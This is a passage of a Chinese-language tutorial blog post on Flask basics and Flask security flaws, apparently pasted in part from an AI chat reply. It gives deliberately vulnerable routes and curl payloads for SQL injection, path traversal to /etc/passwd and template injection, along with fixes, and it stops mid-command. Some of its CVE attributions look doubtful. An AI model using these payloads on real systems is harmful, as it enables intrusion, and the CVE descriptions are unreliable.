class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello, Flask!&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p><strong>解释</strong>：</p><ul><li><code>@app.route(&#39;/&#39;)</code> 是路由装饰器，绑定 URL <code>/</code> 到 <code>index</code> 函数。当用户访问根路径 <code>/</code> 时，将调用 <code>index</code> 函数，返回 <code>&quot;Hello, Flask!&quot;</code>。</li><li><code>app.run(debug=True)</code> 启动服务器并启用调试模式，方便开发时查看错误信息。</li></ul><hr><h3 id="请求与响应"><a href="#请求与响应" class="headerlink" title="请求与响应"></a>请求与响应</h3><p>Flask 通过 <code>request</code> 对象来处理 HTTP 请求数据，通过 <code>response</code> 对象来返回响应结果。</p><p><strong>代码示例</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    username = request.form.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>    password = request.form.get(<span class="hljs-string">&#x27;password&#x27;</span>)<br>    <br>    <span class="hljs-keyword">if</span> username == <span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">and</span> password == <span class="hljs-string">&quot;password&quot;</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Logged in successfully!&quot;</span>&#125;)<br>    <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;failure&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Login failed.&quot;</span>&#125;)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p><strong>解释</strong>：</p><ul><li><code>request.form.get(&#39;username&#39;)</code> 用来获取 POST 请求中的表单数据。</li><li>根据用户名和密码进行简单的身份验证，并返回 JSON 响应，通过 <code>jsonify()</code> 函数将 Python 数据结构转换为 JSON 格式。</li></ul><hr><h3 id="模板渲染"><a href="#模板渲染" class="headerlink" title="模板渲染"></a>模板渲染</h3><p>Flask 使用 Jinja2 模板引擎来渲染 HTML 模板，这样可以将动态数据传递到前端页面。</p><p><strong>代码示例</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/user/&lt;name&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">user</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;user.html&#x27;</span>, name=name)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p><strong>解释</strong>：</p><ul><li><code>render_template(&#39;user.html&#39;, name=name)</code> 加载并渲染 <code>user.html</code> 模板，并将变量 <code>name</code> 传递给模板。</li><li><code>&lt;name&gt;</code> 是 URL 参数，访问 <code>/user/Alice</code> 时，<code>Alice</code> 会被传递给视图函数，渲染到模板中。</li></ul><p>**模板文件 <code>user.html</code>**：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Flask Template<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello, &#123;&#123; name &#125;&#125;!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>当访问 <code>/user/Alice</code> 时，页面将显示 <code>Hello, Alice!</code>。</p><hr><h3 id="会话与-Cookie-管理"><a href="#会话与-Cookie-管理" class="headerlink" title="会话与 Cookie 管理"></a>会话与 Cookie 管理</h3><p>Flask 可以使用会话来存储用户的临时数据，会话数据存储在客户端 Cookie 中，并通过 Flask 的 <code>secret_key</code> 签名以确保安全。</p><p><strong>代码示例</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session<br><br>app = Flask(__name__)<br>app.secret_key = <span class="hljs-string">&#x27;super_secret_key&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/set_session/&lt;username&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_session</span>(<span class="hljs-params">username</span>):<br>    session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Session set for <span class="hljs-subst">&#123;username&#125;</span>&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/get_session&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_session</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">in</span> session:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Logged in as <span class="hljs-subst">&#123;session[<span class="hljs-string">&#x27;username&#x27;</span>]&#125;</span>&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No session set.&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p><strong>解释</strong>：</p><ul><li><code>session[&#39;username&#39;]</code> 用来设置会话变量，并通过 Cookie 保存。</li><li><code>app.secret_key</code> 是用来签名会话数据的密钥，确保数据没有被篡改。</li></ul><hr><ul><li><p>好的！以下是带有详细目录的完整笔记，结合了之前的内容，并根据 Flask 中的常见漏洞（如 SQL 注入、远程代码执行、反序列化漏洞、文件上传路径遍历）进行详细的解释、利用方式、潜在的危害和防御措施。</p><hr><h1 id="Flask-安全漏洞详解与防御措施"><a href="#Flask-安全漏洞详解与防御措施" class="headerlink" title="Flask 安全漏洞详解与防御措施"></a>Flask 安全漏洞详解与防御措施</h1><h2 id="目录-7"><a href="#目录-7" class="headerlink" title="目录"></a>目录</h2><ul><li><a href="#flask-%E6%A1%86%E6%9E%B6%E6%9E%B6%E6%9E%84%E4%B8%8E%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5">Flask 框架架构与基础概念</a><ul><li><a href="#%E8%B7%AF%E7%94%B1%E6%9C%BA%E5%88%B6">路由机制</a></li><li><a href="#%E8%AF%B7%E6%B1%82%E4%B8%8E%E5%93%8D%E5%BA%94">请求与响应</a></li><li><a href="#%E6%A8%A1%E6%9D%BF%E6%B8%B2%E6%9F%93">模板渲染</a></li><li><a href="#%E4%BC%9A%E8%AF%9D%E4%B8%8E-cookie-%E7%AE%A1%E7%90%86">会话与 Cookie 管理</a></li></ul></li><li><a href="#flask-%E5%B8%B8%E8%A7%81%E7%9A%84%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E">Flask 常见的安全漏洞</a><ul><li><a href="#sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E">SQL 注入漏洞</a></li><li><a href="#%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E">路径遍历漏洞</a></li><li><a href="#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8Crce">远程代码执行漏洞 (RCE)</a></li><li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">反序列化漏洞</a></li></ul></li><li><a href="#flask-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95">Flask 漏洞利用方法</a><ul><li><a href="#sql-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">SQL 注入攻击</a></li><li><a href="#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%94%BB%E5%87%BB">远程代码执行攻击</a></li><li><a href="#%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%94%BB%E5%87%BB">路径遍历攻击</a></li><li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB">反序列化攻击</a></li></ul></li><li><a href="#flask-%E5%AE%89%E5%85%A8%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD">Flask 安全防御措施</a><ul><li><a href="#%E4%BD%BF%E7%94%A8-sqlalchemy-%E9%98%B2%E6%AD%A2-sql-%E6%B3%A8%E5%85%A5">使用 SQLAlchemy 防止 SQL 注入</a></li><li><a href="#%E8%B7%AF%E5%BE%84%E5%AE%89%E5%85%A8%E6%80%A7%E6%8E%A7%E5%88%B6">路径安全性控制</a></li><li><a href="#%E7%A6%81%E7%94%A8%E6%A8%A1%E6%9D%BF%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">禁用模板代码执行</a></li><li><a href="#%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE-cookie">安全配置 Cookie</a></li></ul></li><li><a href="#%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93">漏洞总结</a><ul><li><a href="#cve-2019-1010083---sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E">CVE-2019-1010083 - SQL 注入漏洞</a></li><li><a href="#cve-2019-1010084---%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E">CVE-2019-1010084 - 远程代码执行漏洞</a></li><li><a href="#cve-2018-1000656---%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">CVE-2018-1000656 - 反序列化漏洞</a></li><li><a href="#cve-2019-1010085---%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E">CVE-2019-1010085 - 文件上传路径遍历漏洞</a></li></ul></li></ul><hr><h2 id="Flask-框架架构与基础概念-1"><a href="#Flask-框架架构与基础概念-1" class="headerlink" title="Flask 框架架构与基础概念"></a>Flask 框架架构与基础概念</h2><h3 id="路由机制-1"><a href="#路由机制-1" class="headerlink" title="路由机制"></a>路由机制</h3><p>Flask 使用路由装饰器 <code>@app.route()</code> 将 URL 路径映射到视图函数。用户访问特定 URL 时，Flask 调用相应函数并返回结果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello, Flask!&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><h3 id="请求与响应-1"><a href="#请求与响应-1" class="headerlink" title="请求与响应"></a>请求与响应</h3><p>Flask 使用 <code>request</code> 对象处理 HTTP 请求，通过 <code>response</code> 对象返回结果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request, jsonify<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>    password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br>    <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;username&#x27;</span>: username, <span class="hljs-string">&#x27;password&#x27;</span>: password&#125;)<br></code></pre></td></tr></table></figure><h3 id="模板渲染-1"><a href="#模板渲染-1" class="headerlink" title="模板渲染"></a>模板渲染</h3><p>Flask 通过 Jinja2 模板引擎渲染动态 HTML 页面，并允许传递数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/user/&lt;name&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">user</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;user.html&#x27;</span>, name=name)<br></code></pre></td></tr></table></figure><h3 id="会话与-Cookie-管理-1"><a href="#会话与-Cookie-管理-1" class="headerlink" title="会话与 Cookie 管理"></a>会话与 Cookie 管理</h3><p>Flask 会话使用 Cookie 存储临时数据，并通过 <code>secret_key</code> 对数据签名。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">app.secret_key = <span class="hljs-string">&#x27;super_secret_key&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/set_session/&lt;username&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_session</span>(<span class="hljs-params">username</span>):<br>    session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Session set for <span class="hljs-subst">&#123;username&#125;</span>&quot;</span><br></code></pre></td></tr></table></figure><hr><h2 id="Flask-常见的安全漏洞"><a href="#Flask-常见的安全漏洞" class="headerlink" title="Flask 常见的安全漏洞"></a>Flask 常见的安全漏洞</h2><h3 id="SQL-注入漏洞"><a href="#SQL-注入漏洞" class="headerlink" title="SQL 注入漏洞"></a>SQL 注入漏洞</h3><p>SQL 注入漏洞是由于应用程序直接将用户输入的数据嵌入 SQL 查询中，攻击者可以通过构造恶意 SQL 语句绕过身份验证、读取或修改数据库中的敏感信息。</p><p><strong>易受攻击代码示例</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/user&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user</span>():<br>    username = request.args.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>    query = <span class="hljs-string">f&quot;SELECT * FROM users WHERE username = &#x27;<span class="hljs-subst">&#123;username&#125;</span>&#x27;&quot;</span><br>    conn = sqlite3.connect(<span class="hljs-string">&#x27;example.db&#x27;</span>)<br>    result = conn.execute(query)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(result.fetchall())<br></code></pre></td></tr></table></figure><p><strong>攻击方式</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://localhost:5000/user?username=&#x27; OR &#x27;1&#x27;=&#x27;1&quot;</span><br></code></pre></td></tr></table></figure><hr><h3 id="路径遍历漏洞"><a href="#路径遍历漏洞" class="headerlink" title="路径遍历漏洞"></a>路径遍历漏洞</h3><p>路径遍历漏洞允许攻击者通过构造文件路径，访问服务器上的任意文件。</p><p><strong>易受攻击代码示例</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/file/&lt;path:filename&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download_file</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">return</span> send_from_directory(<span class="hljs-string">&#x27;/uploads&#x27;</span>, filename)<br></code></pre></td></tr></table></figure><p><strong>攻击方式</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://localhost:5000/file/../../etc/passwd&quot;</span><br></code></pre></td></tr></table></figure><hr><h3 id="远程代码执行漏洞-RCE"><a href="#远程代码执行漏洞-RCE" class="headerlink" title="远程代码执行漏洞 (RCE)"></a>远程代码执行漏洞 (RCE)</h3><p>模板注入漏洞会导致攻击者能够注入恶意模板代码，执行任意服务器端的 Python 代码。</p><p><strong>易受攻击代码示例</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/template&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">template</span>():<br>    user_input = request.args.get(<span class="hljs-string">&#x27;template&#x27;</span>)<br>    <span class="hljs-keyword">return</span> render_template_string(user_input)<br></code></pre></td></tr></table></figure><p><strong>攻击方式</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://localhost:5000/template?template=&#123;&#123;7*7&#125;&#125;&quot;</span><br></code></pre></td></tr></table></figure><hr><h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><p>反序列化漏洞发生在应用程序不安全地反序列化用户提供的数据时，攻击者可以通过构造恶意的序列化数据来执行任意代码。</p><p><strong>易受攻击代码示例</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/load_data&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_data</span>():<br>    data = request.data<br>    obj = pickle.loads(data)<br>    <span class="hljs-keyword">return</span> obj<br></code></pre></td></tr></table></figure><hr><h2 id="Flask-漏洞利用方法"><a href="#Flask-漏洞利用方法" class="headerlink" title="Flask 漏洞利用方法"></a>Flask 漏洞利用方法</h2><h3 id="SQL-注入攻击"><a href="#SQL-注入攻击" class="headerlink" title="SQL 注入攻击"></a>SQL 注入攻击</h3><p>通过提交恶意的 SQL 语句，攻击者可以操纵 SQL 查询的执行。</p><p><strong>攻击方式</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://localhost:5000/user?username=admin&#x27;--&quot;</span><br></code></pre></td></tr></table></figure><h3 id="远程代码执行攻击"><a href="#远程代码执行攻击" class="headerlink" title="远程代码执行攻击"></a>远程代码执行攻击</h3><p>通过传递恶意的 Jinja2 模板表达式，攻击者可以执行任意代码。</p><p><strong>攻击方式</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://localhost:5000/template?template=&#123;&#123;7*7&#125;&#125;&quot;</span><br></code></pre></td></tr></table></figure><h3 id="路径遍历攻击"><a href="#路径遍历攻击" class="headerlink" title="路径遍历攻击"></a>路径遍历攻击</h3><p>构造恶意文件路径，读取服务器上的任意文件。</p><p><strong>攻击方式</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://localhost:5000/file/../../etc/passwd&quot;</span><br></code></pre></td></tr></table></figure><h3 id="反序列化攻击"><a href="#反序列化攻击" class="headerlink" title="反序列化攻击"></a>反序列化攻击</h3><p>通过发送恶意的序列化数据，攻击者可以控制应用程序执行任意操作。</p><hr></li></ul><h2 id="CVE-2019-1010083-Flask-Security-SQL-注入漏洞"><a href="#CVE-2019-1010083-Flask-Security-SQL-注入漏洞" class="headerlink" title="CVE-2019-1010083 - Flask-Security SQL 注入漏洞"></a>CVE-2019-1010083 - Flask-Security SQL 注入漏洞</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><strong>CVE-2019-1010083</strong> 是 Flask-Security 插件中的 SQL 注入漏洞。Flask-Security 是用于快速集成用户身份认证和权限管理的插件。这个漏洞出现在 Flask-Security 中，在特定情况下，攻击者能够构造恶意 SQL 查询，插入到应用程序的查询语句中，进而执行任意 SQL 操作。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>攻击者可以通过特定参数进行 SQL 注入操作，绕过身份验证或提取敏感数据。</p><h4 id="示例代码："><a href="#示例代码：" class="headerlink" title="示例代码："></a>示例代码：</h4><p>假设应用程序中使用了 Flask-Security 进行用户身份认证，漏洞可能出现在以下代码片段中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><span class="hljs-keyword">import</span> sqlite3<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>    password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br>    query = <span class="hljs-string">f&quot;SELECT * FROM users WHERE username = &#x27;<span class="hljs-subst">&#123;username&#125;</span>&#x27; AND password = &#x27;<span class="hljs-subst">&#123;password&#125;</span>&#x27;&quot;</span><br>    conn = sqlite3.connect(<span class="hljs-string">&#x27;example.db&#x27;</span>)<br>    result = conn.execute(query)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(result.fetchall())<br></code></pre></td></tr></table></figure><h4 id="利用方法："><a href="#利用方法：" class="headerlink" title="利用方法："></a>利用方法：</h4><p>攻击者可以通过提交恶意表单，构造输入来绕过身份验证或查询其他用户信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X POST -d <span class="hljs-string">&quot;username=admin&#x27;--&amp;password=&quot;</span> http://localhost:5000/login<br></code></pre></td></tr></table></figure><p><strong>攻击原理</strong>：</p><ol><li><code>username</code> 参数通过用户输入的方式传递，未经任何过滤和转义直接插入 SQL 查询。</li><li>攻击者可以通过构造 <code>username=admin&#39;--</code>，注释掉后面的 <code>password</code> 查询部分，实现 SQL 注入。</li></ol><p><strong>解决方法</strong>：<br>使用参数化查询或者 ORM 工具，避免直接拼接用户输入到 SQL 查询中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 使用参数化查询防止 SQL 注入</span><br>query = <span class="hljs-string">&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;</span><br>result = conn.execute(query, (username, password))<br></code></pre></td></tr></table></figure><hr><h2 id="CVE-2019-1010084-Flask-远程代码执行漏洞-RCE"><a href="#CVE-2019-1010084-Flask-远程代码执行漏洞-RCE" class="headerlink" title="CVE-2019-1010084 - Flask 远程代码执行漏洞 (RCE)"></a>CVE-2019-1010084 - Flask 远程代码执行漏洞 (RCE)</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><strong>CVE-2019-1010084</strong> 是 Flask 中的远程代码执行漏洞。此漏洞与 Flask 中不安全地使用 <code>render_template_string()</code> 函数有关。<code>render_template_string()</code> 用于动态渲染模板，但如果未对用户输入进行过滤或验证，攻击者可以通过构造恶意模板代码，实现任意代码执行。</p><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>攻击者可以向应用程序传递恶意的 Jinja2 模板表达式，利用 Flask 的模板引擎执行任意代码。</p><h4 id="示例代码：-1"><a href="#示例代码：-1" class="headerlink" title="示例代码："></a>示例代码：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template_string<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/template&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">template</span>():<br>    user_input = request.args.get(<span class="hljs-string">&#x27;template&#x27;</span>)<br>    <span class="hljs-keyword">return</span> render_template_string(user_input)<br></code></pre></td></tr></table></figure><h4 id="利用方法：-1"><a href="#利用方法：-1" class="headerlink" title="利用方法："></a>利用方法：</h4><p>攻击者可以构造恶意的模板表达式进行攻击。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span 